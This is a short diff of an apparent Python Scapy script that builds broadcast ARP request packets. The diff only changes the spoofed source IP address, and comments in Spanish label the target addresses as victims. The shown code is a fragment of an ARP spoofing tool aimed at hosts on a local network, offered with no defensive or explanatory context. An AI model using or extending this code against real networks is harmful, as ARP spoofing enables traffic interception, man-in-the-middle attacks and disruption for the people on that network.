@@ -5,7 +5,7 @@ from os import sys
 ip = sys.argv[1]
 packet = Ether()/ARP()
 packet.op = 1 #request
-packet.psrc="10.12.161.195" #IP DEL HOST
+packet.psrc="10.12.166.77" #IP DEL HOST
 packet.hwdst="ff:ff:ff:ff:ff:ff" # all victims
 packet.pdst = ip # IP DE LA VICTIMA
 packet.dst = "ff:ff:ff:ff:ff:ff" # all victims
